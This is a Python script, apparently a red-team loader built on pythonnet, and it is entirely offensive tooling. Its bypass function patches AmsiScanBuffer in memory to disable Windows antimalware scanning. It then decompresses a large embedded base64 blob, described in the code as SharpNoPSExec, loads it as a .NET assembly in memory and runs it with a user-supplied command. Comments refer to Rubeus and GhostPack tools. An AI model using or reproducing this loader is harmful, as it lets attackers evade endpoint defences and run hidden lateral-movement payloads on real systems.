import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpNoPSExec.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()